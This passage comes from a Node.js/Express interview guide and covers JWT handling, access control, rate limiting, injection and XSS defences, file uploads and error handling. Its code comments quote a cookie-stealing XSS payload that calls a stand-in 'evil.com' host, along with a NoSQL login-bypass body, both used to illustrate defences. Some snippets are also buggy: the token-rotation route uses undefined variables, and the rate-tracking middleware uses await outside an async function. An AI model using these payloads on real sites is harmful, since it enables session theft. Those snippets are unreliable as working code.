// Automatically refresh token when 401 received
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      
      try {
        const { data } = await axios.post('/api/auth/refresh');
        localStorage.setItem('accessToken', data.accessToken);
        originalRequest.headers.Authorization = `Bearer ${data.accessToken}`;
        return axios(originalRequest); // Retry original request
      } catch (refreshError) {
        // Refresh failed - redirect to login
        window.location.href = '/login';
      }
    }
    
    return Promise.reject(error);
  }
);
```

---

<a id="q16-a-user-logs-out-how-will-you-invalidate-the-jwt"></a>
### Q16. A user logs out. How will you invalidate the JWT?

**Answer:**

JWTs are stateless — you can't truly "invalidate" them. Solutions:

```javascript
// Solution 1: Token Blacklist (Redis)
app.post('/api/auth/logout', authMiddleware, async (req, res) => {
  const token = req.headers.authorization.split(' ')[1];
  const decoded = jwt.decode(token);
  const ttl = decoded.exp - Math.floor(Date.now() / 1000); // Remaining time
  
  // Add to blacklist with same TTL as token expiry
  await redis.setEx(`blacklist:${token}`, ttl, 'revoked');
  
  // Also remove refresh token
  await RefreshToken.deleteMany({ userId: req.user.id });
  res.clearCookie('refreshToken');
  
  res.json({ message: 'Logged out successfully' });
});

// Check blacklist in auth middleware
const authMiddleware = async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  // Check if token is blacklisted
  const isBlacklisted = await redis.get(`blacklist:${token}`);
  if (isBlacklisted) return res.status(401).json({ message: 'Token revoked' });
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ message: 'Invalid token' });
  }
};

// Solution 2: Token Version (DB check)
// Store a tokenVersion in user document
// Increment on logout, verify version in middleware
const userSchema = new mongoose.Schema({
  email: String,
  password: String,
  tokenVersion: { type: Number, default: 0 }
});

// On logout:
await User.updateOne({ _id: userId }, { $inc: { tokenVersion: 1 } });

// In middleware, check version matches
```

---

<a id="q17-someone-steals-a-jwt-token-how-can-you-reduce-the-impact"></a>
### Q17. Someone steals a JWT token. How can you reduce the impact?

**Answer:**

1. **Short expiry time** (15 minutes max for access tokens)
2. **Bind token to device/IP:**
```javascript
const accessToken = jwt.sign({
  userId: user._id,
  ip: req.ip,
  userAgent: req.headers['user-agent']
}, JWT_SECRET, { expiresIn: '15m' });

// Verify in middleware
const authMiddleware = (req, res, next) => {
  const decoded = jwt.verify(token, JWT_SECRET);
  if (decoded.ip !== req.ip) {
    return res.status(401).json({ message: 'Token used from different IP' });
  }
  next();
};
```

3. **Refresh token rotation:**
```javascript
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;
  const storedToken = await RefreshToken.findOne({ token: refreshToken });
  
  if (!storedToken) {
    // Token reuse detected! Revoke all tokens for this user
    await RefreshToken.deleteMany({ userId: storedToken?.userId });
    return res.status(403).json({ message: 'Possible token theft detected' });
  }
  
  // Delete old refresh token
  await RefreshToken.deleteOne({ token: refreshToken });
  
  // Issue new refresh token (rotation)
  const newRefreshToken = jwt.sign({ userId: decoded.userId }, REFRESH_SECRET, { expiresIn: '7d' });
  await RefreshToken.create({ token: newRefreshToken, userId: decoded.userId });
  
  res.cookie('refreshToken', newRefreshToken, { httpOnly: true, secure: true });
  res.json({ accessToken: newAccessToken });
});
```

4. **Use HTTP-only, Secure cookies** instead of localStorage
5. **Implement logout from all devices**

---

<a id="q18-admin-should-access-only-admin-apis-how-will-you-implement-it"></a>
### Q18. Admin should access only admin APIs. How will you implement it?

**Answer:**

```javascript
// Role-Based Access Control (RBAC)

// 1. Store role in user model
const userSchema = new mongoose.Schema({
  email: String,
  password: String,
  role: { type: String, enum: ['user', 'admin', 'moderator'], default: 'user' }
});

// 2. Include role in JWT
const token = jwt.sign({ userId: user._id, role: user.role }, JWT_SECRET);

// 3. Create role-checking middleware
const authorize = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ message: 'Not authenticated' });
    }
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ message: 'Forbidden: Insufficient permissions' });
    }
    next();
  };
};

// 4. Use in routes
// Only admins can delete users
router.delete('/users/:id', authMiddleware, authorize('admin'), deleteUser);

// Admins and moderators can update products
router.put('/products/:id', authMiddleware, authorize('admin', 'moderator'), updateProduct);

// Any authenticated user can view products
router.get('/products', authMiddleware, authorize('user', 'admin', 'moderator'), getProducts);

// 5. For more complex permissions:
const permissions = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  moderator: ['read', 'write', 'delete'],
  user: ['read', 'write']
};

const checkPermission = (requiredPermission) => {
  return (req, res, next) => {
    const userPermissions = permissions[req.user.role] || [];
    if (!userPermissions.includes(requiredPermission)) {
      return res.status(403).json({ message: 'Permission denied' });
    }
    next();
  };
};
```

---

<a id="q19-users-are-making-requests-without-authentication-how-will-you-secure-the-apis"></a>
### Q19. Users are making requests without authentication. How will you secure the APIs?

**Answer:**

```javascript
// 1. Authentication Middleware (apply globally or per route)
const authMiddleware = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'Access token required' });
  }
  
  const token = authHeader.split(' ')[1];
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ message: 'Token expired', code: 'TOKEN_EXPIRED' });
    }
    return res.status(401).json({ message: 'Invalid token' });
  }
};

// 2. Apply to all routes except public ones
// Public routes
app.use('/api/auth', authRoutes);
app.use('/api/public', publicRoutes);

// Protected routes (middleware applied)
app.use('/api/users', authMiddleware, userRoutes);
app.use('/api/products', authMiddleware, productRoutes);
app.use('/api/orders', authMiddleware, orderRoutes);

// 3. API Key for service-to-service communication
const apiKeyMiddleware = (req, res, next) => {
  const apiKey = req.headers['x-api-key'];
  if (!apiKey || apiKey !== process.env.SERVICE_API_KEY) {
    return res.status(401).json({ message: 'Invalid API key' });
  }
  next();
};

// 4. Rate limiting for public endpoints
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, try again after 15 minutes'
});
app.use('/api/auth/login', loginLimiter);
```

---

<a id="scenario-4-security"></a>
## Scenario 4: Security

<a id="q20-your-api-is-receiving-10000-requests-per-minute-from-one-ip-what-will-you-do"></a>
### Q20. Your API is receiving 10,000 requests per minute from one IP. What will you do?

**Answer:**

```javascript
// 1. Rate Limiting (express-rate-limit)
const rateLimit = require('express-rate-limit');

const generalLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute per IP
  message: { error: 'Too many requests, please try again later' },
  standardHeaders: true,
  legacyHeaders: false
});

app.use(generalLimiter);

// 2. Stricter limit for sensitive endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true // Only count failed attempts
});
app.use('/api/auth/login', authLimiter);

// 3. Redis-based rate limiting (for distributed systems)
const RedisStore = require('rate-limit-redis');
const limiter = rateLimit({
  store: new RedisStore({ client: redisClient }),
  windowMs: 60 * 1000,
  max: 100
});

// 4. IP Blocking for known abusers
const blockedIPs = new Set();

app.use((req, res, next) => {
  if (blockedIPs.has(req.ip)) {
    return res.status(403).json({ message: 'IP blocked' });
  }
  next();
});

// 5. At infrastructure level:
// - AWS WAF (Web Application Firewall)
// - Cloudflare DDoS protection
// - Nginx rate limiting:
// limit_req_zone $binary_remote_addr zone=api:10m rate=100r/m;

// 6. Detect and alert
app.use((req, res, next) => {
  // Track requests per IP
  const count = await redis.incr(`requests:${req.ip}`);
  await redis.expire(`requests:${req.ip}`, 60);
  
  if (count > 1000) {
    console.alert(`Possible DDoS from ${req.ip}: ${count} requests/min`);
    blockedIPs.add(req.ip);
  }
  next();
});
```

---

<a id="q21-someone-is-trying-sqlnosql-injection-how-will-you-prevent-it"></a>
### Q21. Someone is trying SQL/NoSQL Injection. How will you prevent it?

**Answer:**

```javascript
// NoSQL Injection Example:
// Attacker sends: { "email": { "$gt": "" }, "password": { "$gt": "" } }
// This would match ALL users!

// 1. Input Validation with express-validator
const { body, validationResult } = require('express-validator');

app.post('/api/auth/login', [
  body('email').isEmail().normalizeEmail(),
  body('password').isString().isLength({ min: 6, max: 100 })
], async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Safe to proceed
});

// 2. Sanitize input (mongo-sanitize)
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // Removes $ and . from req.body, req.query, req.params

// 3. Type checking before query
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Ensure string type (prevents object injection)
  if (typeof email !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ message: 'Invalid input types' });
  }
  
  const user = await User.findOne({ email: email.toLowerCase() });
  // ...
});

// 4. Use parameterized queries (for SQL databases)
// BAD:
// const query = `SELECT * FROM users WHERE email = '${email}'`;
// GOOD:
// const query = 'SELECT * FROM users WHERE email = $1';
// db.query(query, [email]);

// 5. Joi validation schema
const Joi = require('joi');

const loginSchema = Joi.object({
  email: Joi.string().email().required(),
  password: Joi.string().min(6).max(100).required()
});

app.post('/api/auth/login', async (req, res) => {
  const { error } = loginSchema.validate(req.body);
  if (error) return res.status(400).json({ message: error.details[0].message });
});
```

---

<a id="q22-how-do-you-protect-against-xss-attacks"></a>
### Q22. How do you protect against XSS attacks?

**Answer:**

```javascript
// XSS = Cross-Site Scripting
// Attacker injects: <script>fetch('evil.com/steal?cookie='+document.cookie)</script>

// 1. Helmet.js - sets security headers
const helmet = require('helmet');
app.use(helmet()); // Sets Content-Security-Policy, X-XSS-Protection, etc.

// 2. Sanitize user input before storing
const sanitizeHtml = require('sanitize-html');

app.post('/api/products', async (req, res) => {
  const cleanDescription = sanitizeHtml(req.body.description, {
    allowedTags: ['b', 'i', 'em', 'strong', 'p'],
    allowedAttributes: {}
  });
  
  await Product.create({
    name: req.body.name,
    description: cleanDescription // Stripped of malicious scripts
  });
});

// 3. Content Security Policy
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // Only allow scripts from same origin
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.yourdomain.com"]
  }
}));

// 4. HTTP-Only cookies (JavaScript can't access them)
res.cookie('token', refreshToken, {
  httpOnly: true,    // Can't be accessed via document.cookie
  secure: true,      // Only sent over HTTPS
  sameSite: 'strict' // Not sent with cross-origin requests
});

// 5. React automatically escapes JSX (frontend protection)
// This is safe in React:
// <p>{userInput}</p>  -- React escapes HTML entities
// This is DANGEROUS:
// <div dangerouslySetInnerHTML={{ __html: userInput }} />  -- NEVER with user input!

// 6. Encode output
const escapeHtml = (str) => {
  return str.replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};
```

---

<a id="q23-api-is-exposed-publicly-what-security-measures-will-you-implement-before-deployment"></a>
### Q23. API is exposed publicly. What security measures will you implement before deployment?

**Answer:**

```javascript
// Security Checklist for Production APIs:

const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const mongoSanitize = require('express-mongo-sanitize');
const hpp = require('hpp');

const app = express();

// 1. Helmet - Security headers
app.use(helmet());

// 2. CORS - Restrict origins
app.use(cors({
  origin: ['https://yourfrontend.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true
}));

// 3. Rate Limiting
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));

// 4. Body size limit (prevent large payload attacks)
app.use(express.json({ limit: '10kb' }));

// 5. NoSQL injection prevention
app.use(mongoSanitize());

// 6. HTTP Parameter Pollution prevention
app.use(hpp());

// 7. HTTPS only (redirect HTTP to HTTPS)
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.headers.host}${req.url}`);
  }
  next();
});

// 8. Remove X-Powered-By header
app.disable('x-powered-by');

// 9. Input validation on ALL endpoints
// 10. Authentication & Authorization on protected routes
// 11. Error handling that doesn't leak stack traces
app.use((err, req, res, next) => {
  console.error(err); // Log full error
  res.status(err.statusCode || 500).json({
    message: process.env.NODE_ENV === 'production' 
      ? 'Something went wrong' 
      : err.message
  });
});

// 12. Environment variables for secrets (never hardcode)
// 13. Database connection with authentication
// 14. Enable audit logging
// 15. Regular dependency updates (npm audit)
```

---

<a id="q24-passwords-are-stored-in-plain-text-in-an-old-project-how-would-you-migrate-to-hashed-passwords"></a>
### Q24. Passwords are stored in plain text in an old project. How would you migrate to hashed passwords?

**Answer:**

```javascript
const bcrypt = require('bcryptjs');

// Migration script (run once)
async function migratePasswords() {
  const users = await User.find({ passwordMigrated: { $ne: true } });
  
  console.log(`Migrating ${users.length} users...`);
  
  let migrated = 0;
  for (const user of users) {
    try {
      const hashedPassword = await bcrypt.hash(user.password, 12);
      await User.updateOne(
        { _id: user._id },
        { 
          $set: { password: hashedPassword, passwordMigrated: true }
        }
      );
      migrated++;
      if (migrated % 1000 === 0) console.log(`Migrated ${migrated}/${users.length}`);
    } catch (error) {
      console.error(`Failed for user ${user._id}:`, error.message);
    }
  }
  
  console.log(`Migration complete: ${migrated} users migrated`);
}

// Updated login that handles both old and new passwords during migration
async function login(email, password) {
  const user = await User.findOne({ email });
  if (!user) throw new Error('Invalid credentials');
  
  if (user.passwordMigrated) {
    // New flow: compare with hash
    const isValid = await bcrypt.compare(password, user.password);
    if (!isValid) throw new Error('Invalid credentials');
  } else {
    // Legacy flow: direct comparison, then migrate
    if (user.password !== password) throw new Error('Invalid credentials');
    
    // Migrate this user's password now
    const hashed = await bcrypt.hash(password, 12);
    await User.updateOne(
      { _id: user._id },
      { $set: { password: hashed, passwordMigrated: true } }
    );
  }
  
  return generateToken(user);
}

// After all users have logged in at least once (or after batch migration):
// Remove the passwordMigrated field
// Force password reset for users who haven't logged in
```

---

<a id="scenario-5-file-upload"></a>
## Scenario 5: File Upload

<a id="q25-users-upload-5-gb-videos-how-will-you-handle-them"></a>
### Q25. Users upload 5 GB videos. How will you handle them?

**Answer:**

```javascript
// NEVER load 5GB into memory! Use multipart/chunked upload.

// Solution 1: Chunked Upload (Client splits file into parts)
// Frontend:
async function uploadLargeFile(file) {
  const CHUNK_SIZE = 5 * 1024 * 1024; // 5MB chunks
  const totalChunks = Math.ceil(file.size / CHUNK_SIZE);
  const uploadId = crypto.randomUUID();
  
  for (let i = 0; i < totalChunks; i++) {
    const chunk = file.slice(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
    const formData = new FormData();
    formData.append('chunk', chunk);
    formData.append('chunkIndex', i);
    formData.append('totalChunks', totalChunks);
    formData.append('uploadId', uploadId);
    
    await axios.post('/api/upload/chunk', formData, {
      onUploadProgress: (p) => {
        const overall = ((i * CHUNK_SIZE + p.loaded) / file.size) * 100;
        setProgress(overall);
      }
    });
  }
  
  // Merge chunks
  await axios.post('/api/upload/complete', { uploadId, totalChunks });
}

// Backend:
app.post('/api/upload/chunk', upload.single('chunk'), async (req, res) => {
  const { uploadId, chunkIndex } = req.body;
  const chunkPath = `./temp/${uploadId}/chunk_${chunkIndex}`;
  await fs.promises.mkdir(`./temp/${uploadId}`, { recursive: true });
  await fs.promises.rename(req.file.path, chunkPath);
  res.json({ received: chunkIndex });
});

app.post('/api/upload/complete', async (req, res) => {
  const { uploadId, totalChunks } = req.body;
  const outputPath = `./uploads/${uploadId}.mp4`;
  const writeStream = fs.createWriteStream(outputPath);
  
  for (let i = 0; i < totalChunks; i++) {
    const chunkPath = `./temp/${uploadId}/chunk_${i}`;
    const data = await fs.promises.readFile(chunkPath);
    writeStream.write(data);
  }
  writeStream.end();
  
  // Upload to S3
  await uploadToS3(outputPath);
  // Cleanup temp files
  await fs.promises.rm(`./temp/${uploadId}`, { recursive: true });
  
  res.json({ message: 'Upload complete', url: s3Url });
});

// Solution 2: S3 Presigned URL (Recommended for production)
// Client uploads directly to S3, bypasses your server
const AWS = require('aws-sdk');
const s3 = new AWS.S3();

app.post('/api/upload/presigned-url', authMiddleware, async (req, res) => {
  const { fileName, fileType } = req.body;
  const key = `videos/${req.user.id}/${Date.now()}_${fileName}`;
  
  const url = await s3.getSignedUrlPromise('putObject', {
    Bucket: 'my-videos-bucket',
    Key: key,
    ContentType: fileType,
    Expires: 3600 // URL valid for 1 hour
  });
  
  res.json({ uploadUrl: url, key });
});

// Solution 3: S3 Multipart Upload (for very large files)
app.post('/api/upload/initiate', async (req, res) => {
  const multipart = await s3.createMultipartUpload({
    Bucket: 'my-bucket',
    Key: `videos/${req.body.fileName}`
  }).promise();
  
  res.json({ uploadId: multipart.UploadId });
});
```

---

<a id="q26-users-upload-100-images-simultaneously-what-problems-can-occur"></a>
### Q26. Users upload 100 images simultaneously. What problems can occur?

**Answer:**

**Problems:**
- Memory overflow (100 images × 5MB = 500MB in memory)
- File descriptor limit exceeded
- Server becomes unresponsive
- Disk space fills up if temp files aren't cleaned

**Solutions:**

```javascript
const multer = require('multer');

// 1. Limit concurrent uploads
const upload = multer({
  storage: multer.diskStorage({
    destination: './temp-uploads',
    filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
  }),
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB per file
    files: 10 // Max 10 files per request
  }
});

app.post('/api/images', upload.array('images', 10), processImages);

// 2. Queue-based processing (process one at a time)
const Queue = require('bull');
const imageQueue = new Queue('image-processing', { redis: redisConfig });

app.post('/api/images/batch', upload.array('images', 10), async (req, res) => {
  const jobs = req.files.map(file => 
    imageQueue.add({ filePath: file.path, userId: req.user.id })
  );
  
  const jobIds = await Promise.all(jobs);
  res.json({ message: 'Processing started', jobIds: jobIds.map(j => j.id) });
});

imageQueue.process(3, async (job) => { // Process 3 at a time
  const { filePath, userId } = job.data;
  const compressed = await sharp(filePath).resize(800).jpeg({ quality: 80 }).toBuffer();
  await uploadToS3(compressed);
  await fs.promises.unlink(filePath); // Cleanup
});

// 3. Frontend: Batch uploads with concurrency control
async function uploadImages(files) {
  const BATCH_SIZE = 3;
  for (let i = 0; i < files.length; i += BATCH_SIZE) {
    const batch = files.slice(i, i + BATCH_SIZE);
    await Promise.all(batch.map(file => uploadSingle(file)));
  }
}

// 4. Backpressure handling
app.use((req, res, next) => {
  const activeUploads = getActiveUploadCount();
  if (activeUploads > 50) {
    return res.status(503).json({ message: 'Server busy, try again later' });
  }
  next();
});
```

---

<a id="q27-how-will-you-validate-uploaded-files"></a>
### Q27. How will you validate uploaded files?

**Answer:**

```javascript
const multer = require('multer');
const fileType = require('file-type');

// 1. MIME type validation (don't trust Content-Type header alone!)
const allowedTypes = ['image/jpeg', 'image/png', 'image/webp', 'application/pdf'];

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    if (!allowedTypes.includes(file.mimetype)) {
      return cb(new Error('Invalid file type'), false);
    }
    cb(null, true);
  }
});

// 2. Validate ACTUAL file content (magic bytes)
app.post('/api/upload', upload.single('file'), async (req, res) => {
  // Check actual file type from content (not just extension/header)
  const type = await fileType.fromBuffer(req.file.buffer);
  
  if (!type || !allowedTypes.includes(type.mime)) {
    return res.status(400).json({ message: 'File content does not match allowed types' });
  }
  
  // 3. Check file dimensions for images
  const sharp = require('sharp');
  if (type.mime.startsWith('image/')) {
    const metadata = await sharp(req.file.buffer).metadata();
    if (metadata.width > 4000 || metadata.height > 4000) {
      return res.status(400).json({ message: 'Image too large (max 4000x4000)' });
    }
  }
  
  // 4. Scan for malware (in production)
  // await scanWithClamAV(req.file.buffer);
  
  // 5. Strip EXIF data (privacy)
  const cleanImage = await sharp(req.file.buffer)
    .rotate() // Auto-rotate based on EXIF
    .toBuffer();
  
  // 6. Rename file (never use original filename directly)
  const safeFilename = `${crypto.randomUUID()}.${type.ext}`;
  
  res.json({ message: 'File uploaded', filename: safeFilename });
});

// 7. Validate file extension
const path = require('path');
const allowedExtensions = ['.jpg', '.jpeg', '.png', '.pdf'];
const ext = path.extname(file.originalname).toLowerCase();
if (!allowedExtensions.includes(ext)) {
  return res.status(400).json({ message: 'Invalid file extension' });
}
```

---

<a id="q28-where-will-you-store-uploaded-files-in-aws"></a>
### Q28. Where will you store uploaded files in AWS?

**Answer:**

```javascript
// Amazon S3 is the standard for file storage

const AWS = require('aws-sdk');
const s3 = new AWS.S3({
  region: 'ap-south-1',
  accessKeyId: process.env.AWS_ACCESS_KEY,
  secretAccessKey: process.env.AWS_SECRET_KEY
});

// Upload to S3
async function uploadToS3(file, folder = 'uploads') {
  const key = `${folder}/${Date.now()}_${crypto.randomUUID()}${path.extname(file.originalname)}`;
  
  const params = {
    Bucket: process.env.S3_BUCKET,
    Key: key,
    Body: file.buffer,
    ContentType: file.mimetype,
    // ACL: 'private' // Don't make public by default
  };
  
  const result = await s3.upload(params).promise();
  return result.Location; // S3 URL
}

// Serve files through CloudFront CDN (faster, cheaper)
// CloudFront URL: https://d1234.cloudfront.net/uploads/image.jpg

// For private files, use presigned URLs
async function getPresignedUrl(key) {
  return s3.getSignedUrlPromise('getObject', {
    Bucket: process.env.S3_BUCKET,
    Key: key,
    Expires: 3600 // 1 hour
  });
}

// S3 Bucket structure:
// my-app-bucket/
// ├── uploads/
// │   ├── images/      (profile pics, thumbnails)
// │   ├── documents/   (PDFs, contracts)
// │   └── videos/      (user-uploaded videos)
// ├── processed/       (compressed/resized versions)
// └── temp/            (lifecycle rule: delete after 24h)

// S3 Lifecycle rules:
// - Move to S3 Glacier after 90 days (cheap archival)
// - Delete temp files after 1 day
// - Move old logs to Infrequent Access after 30 days
```

---

<a id="q29-how-will-you-generate-unique-file-names"></a>
### Q29. How will you generate unique file names?

**Answer:**

```javascript
const crypto = require('crypto');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// Method 1: UUID (Recommended - guaranteed unique)
function generateFilename(originalName) {
  const ext = path.extname(originalName).toLowerCase();
  return `${uuidv4()}${ext}`;
  // Output: "550e8400-e29b-41d4-a716-446655440000.jpg"
}

// Method 2: Timestamp + Random (Good for sorted listing)
function generateFilename(originalName) {
  const ext = path.extname(originalName).toLowerCase();
  const timestamp = Date.now();
  const random = crypto.randomBytes(8).toString('hex');
  return `${timestamp}_${random}${ext}`;
  // Output: "1690000000000_a1b2c3d4e5f6g7h8.jpg"
}

// Method 3: Content Hash (Deduplication - same content = same name)
function generateFilename(buffer, originalName) {
  const ext = path.extname(originalName).toLowerCase();
  const hash = crypto.createHash('sha256').update(buffer).digest('hex');
  return `${hash}${ext}`;
  // Same file always gets same name = no duplicates in storage
}

// Method 4: Structured path with user context
function generateFilePath(userId, originalName, type = 'images') {
  const ext = path.extname(originalName).toLowerCase();
  const date = new Date();
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, '0');
  
  return `${type}/${year}/${month}/${userId}/${uuidv4()}${ext}`;
  // Output: "images/2024/03/user123/uuid.jpg"
  // Benefits: organized, easy to find by user/date, no conflicts
}
```

---

<a id="scenario-6-expressjs"></a>
## Scenario 6: Express.js

<a id="q30-middleware-is-not-getting-executed-how-will-you-debug-it"></a>
### Q30. Middleware is not getting executed. How will you debug it?

**Answer:**

```javascript
// Common reasons middleware doesn't execute:

// 1. ORDER MATTERS! Middleware must be defined BEFORE routes
// BAD:
app.get('/api/users', getUsers); // Route defined first
app.use(authMiddleware); // Middleware defined after - won't apply to above route!

// GOOD:
app.use(authMiddleware); // Middleware first
app.get('/api/users', getUsers); // Then routes

// 2. Missing next() call
// BAD:
const logMiddleware = (req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  // Forgot next()! Request hangs here forever
};

// GOOD:
const logMiddleware = (req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next(); // Pass control to next middleware/route
};

// 3. Error in middleware that's not caught
// BAD:
const authMiddleware = (req, res, next) => {
  const decoded = jwt.verify(token, secret); // Throws if invalid!
  req.user = decoded;
  next();
};

// GOOD:
const authMiddleware = (req, res, next) => {
  try {
    const decoded = jwt.verify(token, secret);
    req.user = decoded;
    next();
  } catch (error) {
    next(error); // Pass error to error handler
  }
};

// 4. Route-specific middleware applied to wrong path
// This middleware only applies to /api/admin routes:
app.use('/api/admin', adminMiddleware);
// But your request goes to /api/users - middleware won't fire!

// 5. Debug technique: Add logging to trace flow
app.use((req, res, next) => { console.log('MW 1: Global'); next(); });
app.use('/api', (req, res, next) => { console.log('MW 2: /api'); next(); });
app.use('/api/admin', (req, res, next) => { console.log('MW 3: /api/admin'); next(); });
app.get('/api/admin/users', (req, res) => { console.log('Handler reached'); });
```

---

<a id="q31-a-request-never-reaches-the-controller-what-could-be-wrong"></a>
### Q31. A request never reaches the controller. What could be wrong?

**Answer:**

```javascript
// Checklist to debug:

// 1. Route path mismatch
// Request: GET /api/products/123
// Route defined as: app.get('/api/product/:id') // Missing 's' in products!

// 2. HTTP method mismatch
// Request: POST /api/users
// Route: app.get('/api/users', handler); // GET instead of POST!

// 3. Middleware blocking the request
app.use(authMiddleware); // If auth fails, returns 401, never reaches controller

// 4. Body parser not configured
// Request has JSON body but Express can't parse it
app.use(express.json()); // Must be added before routes!

// 5. Route order - earlier route catches it
app.get('/api/users/:id', getUserById); // '/api/users/profile' matches :id = 'profile'
app.get('/api/users/profile', getProfile); // Never reached!

// FIX: Put specific routes before parametric ones
app.get('/api/users/profile', getProfile); // Specific first
app.get('/api/users/:id', getUserById);    // Parametric after

// 6. Router not mounted
const userRouter = express.Router();
userRouter.get('/', getUsers);
// Forgot: app.use('/api/users', userRouter);

// 7. Debug with a catch-all
app.use('*', (req, res) => {
  console.log(`No route matched: ${req.method} ${req.originalUrl}`);
  res.status(404).json({ message: 'Route not found' });
});
```

---

<a id="q32-api-always-returns-500-internal-server-error-how-will-you-debug-it"></a>
### Q32. API always returns 500 Internal Server Error. How will you debug it?

**Answer:**

```javascript
// 1. Check error handler - it might be swallowing real errors
// BAD:
app.use((err, req, res, next) => {
  res.status(500).json({ message: 'Server error' }); // No logging!
});

// GOOD:
app.use((err, req, res, next) => {
  console.error('ERROR:', {
    message: err.message,
    stack: err.stack,
    url: req.originalUrl,
    method: req.method,
    body: req.body,
    user: req.user?.id
  });
  
  res.status(err.statusCode || 500).json({
    message: process.env.NODE_ENV === 'development' ? err.message : 'Server error',
    ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
  });
});

// 2. Wrap async handlers (unhandled promise rejections cause 500)
// BAD:
app.get('/api/users', async (req, res) => {
  const users = await User.find(); // If this throws, no error handling!
  res.json(users);
});

// GOOD: Async wrapper
const asyncHandler = (fn) => (req, res, next) => {
  Promise.resolve(fn(req, res, next)).catch(next);
};

app.get('/api/users', asyncHandler(async (req, res) => {
  const users = await User.find();
  res.json(users);
}));

// Or use express-async-errors package:
require('express-async-errors'); // Just import - auto-wraps async routes

// 3. Common causes of 500:
// - Database connection failed
// - Environment variable undefined (process.env.SECRET is undefined)
// - TypeError: Cannot read property 'x' of null
// - JSON.parse() on invalid JSON

// 4. Add request-level logging
const morgan = require('morgan');
app.use(morgan('dev')); // Logs: GET /api/users 500 25ms
```

---

<a id="q33-how-do-you-implement-centralized-error-handling"></a>
### Q33. How do you implement centralized error handling?

**Answer:**

```javascript
// 1. Create custom error class
class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = true; // Distinguishes from programming errors
    Error.captureStackTrace(this, this.constructor);
  }
}

class NotFoundError extends AppError {
  constructor(resource = 'Resource') {
    super(`${resource} not found`, 404);
  }
}

class ValidationError extends AppError {
  constructor(message) {
    super(message, 400);
  }
}

class UnauthorizedError extends AppError {
  constructor(message = 'Not authenticated') {
    super(message, 401);
  }
}

// 2. Use in controllers
const getUser = asyncHandler(async (req, res) => {
  const user = await User.findById(req.params.id);
  if (!user) throw new NotFoundError('User');
  res.json(user);
});

const createUser = asyncHandler(async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) throw new ValidationError('Email and password required');
  
  const user = await User.create({ email, password });
  res.status(201).json(user);
});

// 3. Global error handler middleware (MUST have 4 parameters)
const errorHandler = (err, req, res, next) => {
  // Log error
  console.error(`[${new Date().toISOString()}] ${err.message}`, {
    url: req.originalUrl,
    method: req.method,
    stack: err.stack
  });
  
  // Mongoose validation error
  if (err.name === 'ValidationError') {
    const messages = Object.values(err.errors).map(e => e.message);
    return res.status(400).json({ message: 'Validation Error', errors: messages });
  }
  
  // Mongoose duplicate key
  if (err.code === 11000) {
    const field = Object.keys(err.keyValue)[0];
    return res.status(409).json({ message: `${field} already exists` });
  }
  
  // JWT errors
  if (err.name === 'JsonWebTokenError') {
    return res.status(401).json({ message: 'Invalid token' });
  }
  
  if (err.name === 'TokenExpiredError') {
    return res.status(401).json({ message: 'Token expired' });
  }
  
  // Operational errors (expected)
  if (err.isOperational) {
    return res.status(err.statusCode).json({ message: err.message });
  }
  
  // Programming errors (unexpected) - don't leak details
  res.status(500).json({ message: 'Something went wrong' });
};

// 4. Register error handler LAST
app.use('/api/users', userRoutes);
app.use('/api/products', productRoutes);
app.use(errorHandler); // Must be after all routes

// 5. Handle unhandled rejections and exceptions
process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Rejection:', reason);
  // Graceful shutdown
  server.close(() => process.exit(1));
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
